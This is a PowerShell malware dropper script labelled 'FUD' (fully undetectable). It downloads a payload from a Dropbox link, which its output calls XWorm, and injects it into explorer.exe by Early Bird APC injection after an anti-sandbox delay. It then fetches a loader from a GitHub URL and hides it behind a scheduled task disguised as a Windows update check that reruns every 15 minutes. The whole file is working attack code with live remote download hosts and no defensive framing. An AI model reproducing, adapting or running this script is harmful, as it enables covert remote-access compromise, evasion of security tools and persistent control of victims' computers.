# ==========================================
# FUD DEPLOY SCRIPT (APC INJECTION + COM)
# ==========================================

# --- CONFIGURATION ---
$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/SearchIndex.exe'
$LoaderPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndex.exe"
$TaskName   = "WindowsUpdateCheck"

# --- 1. CLEANUP (Remove Old Traces) ---
try {
    Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 2. EARLY BIRD APC INJECTION (FUD EXECUTION) ---
Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
[DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
[DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
"@ -Name "Win32" -Namespace Win32Functions

function Invoke-APCInjection {
    param($PayloadUrl)
    
    Write-Host "Injecting via Early Bird APC..." -F Gray
    
    # Anti-Sandbox Delay
    Start-Sleep -Milliseconds 5000
    
    # Download payload bytes
    try {
        $bytes = (New-Object Net.WebClient).DownloadData($PayloadUrl)
    } catch { return }
    
    # Target: explorer.exe (Trusted process, always running)
    $target = Get-Process explorer | Select-Object -First 1
    
    # Open target process with full access
    $hProcess = [Win32Functions.Win32]::OpenProcess(0x1F0FFF, $false, $target.Id)
    if ($hProcess -eq [IntPtr]::Zero) { return }
    
    # Allocate RWX memory in target process
    $remoteMem = [Win32Functions.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
    if ($remoteMem -eq [IntPtr]::Zero) { return }
    
    # Write payload to target memory (No disk drop)
    [UIntPtr]$bytesWritten = [UIntPtr]::Zero
    $result = [Win32Functions.Win32]::WriteProcessMemory($hProcess, $remoteMem, $bytes, $bytes.Length, [ref]$bytesWritten)
    if (-not $result) { return }
    
    # Get main thread and queue APC (Executes on next thread alert)
    $hThread = [Win32Functions.Win32]::OpenThread(0x40, $false, $target.Threads[0].Id)
    if ($hThread -ne [IntPtr]::Zero) {
        [Win32Functions.Win32]::QueueUserAPC($remoteMem, $hThread, [IntPtr]::Zero)
        Write-Host "✅ XWorm injected into explorer.exe (PID: $($target.Id))" -F Green
    }
}

# --- 3. PERSISTENCE (C++ Loader via COM - Infinite Loop) ---
try {
    # Download C++ Loader
    try {
        $wc = New-Object Net.WebClient
        $wc.DownloadFile($LoaderUrl, $LoaderPath)
    } catch {}

    # COM Object Persistence (Bulletproof)
    $service = New-Object -ComObject Schedule.Service
    $service.Connect()
    $rootFolder = $service.GetFolder("\")
    
    $taskDef = $service.NewTask(0)
    $taskDef.RegistrationInfo.Description = "System Integrity Check"
    $taskDef.Settings.Enabled = $true
    $taskDef.Settings.Hidden = $true
    $taskDef.Settings.MultipleInstances = 2
    $taskDef.Settings.DisallowStartIfOnBatteries = $false
    $taskDef.Settings.StopIfGoingOnBatteries = $false
    
    # Logon Trigger + 15min Infinite Repetition
    $trigger = $taskDef.Triggers.Create(9)
    $trigger.Enabled = $true
    $trigger.Repetition.Interval = "PT15M"
    
    # Action: Run C++ Loader
    $action = $taskDef.Actions.Create(0)
    $action.Path = $LoaderPath
    
    # Register (Creates/Updates)
    $rootFolder.RegisterTaskDefinition($TaskName, $taskDef, 6, "BUILTIN\Users", $null, 4) | Out-Null
    
    Write-Host "✅ Persistence: Every 15min via C++ Loader" -F Green

} catch {
    Write-Host "⚠️ Persistence Failed" -F Yellow
}

# --- 4. EXECUTE PAYLOAD NOW ---
Invoke-APCInjection -PayloadUrl $PayloadUrl

# --- 5. START PERSISTENCE LOOP ---
Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
